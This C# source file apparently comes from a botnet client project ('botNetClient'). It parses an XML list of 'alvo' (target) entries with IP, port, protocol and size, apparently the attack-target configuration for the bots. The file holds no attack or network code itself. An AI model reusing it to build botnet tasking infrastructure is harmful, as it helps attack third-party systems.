using System;
using System.Collections.Generic;
using System.Xml;

namespace botNetClient.utils
{
    public class RankModel
    {

        public string _description, _ip, _protocol;
        public int _port, _size;
        public RankModel(string description, string ip, int port, string protocol, int size)
        {
            _description = description;
            _ip = ip;
            _port = port;
            _protocol = protocol;
            _size = size;
        }
    }


    class ReadXML
    {

        public static List<RankModel> _ranks = new List<RankModel>();



        public static void loadXML(string xtx)
        {

            ReadXML._ranks.Clear();
            XmlDocument xmlDocument = new XmlDocument();
            try
            {
                xmlDocument.LoadXml(xtx);
                for (XmlNode xmlNode1 = xmlDocument.FirstChild; xmlNode1 != null; xmlNode1 = xmlNode1.NextSibling)
                {
                    if ("list".Equals(xmlNode1.Name))
                    {
                        for (XmlNode xmlNode2 = xmlNode1.FirstChild; xmlNode2 != null; xmlNode2 = xmlNode2.NextSibling)
                        {


                            if ("alvo".Equals(xmlNode2.Name))
                            {
                                XmlNamedNodeMap xml = xmlNode2.Attributes;

                                _ranks.Add(
                                    new RankModel(
                                        xml.GetNamedItem("description").Value,
                                        xml.GetNamedItem("ip").Value,
                                        int.Parse(xml.GetNamedItem("port").Value),
                                        xml.GetNamedItem("protocol").Value,
                                        ( int.Parse(xml.GetNamedItem("size").Value) < 1 ? 1 : int.Parse(xml.GetNamedItem("size").Value))
                                    )
                                );

                            }
                        }
                    }

                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }


        }



    }
}
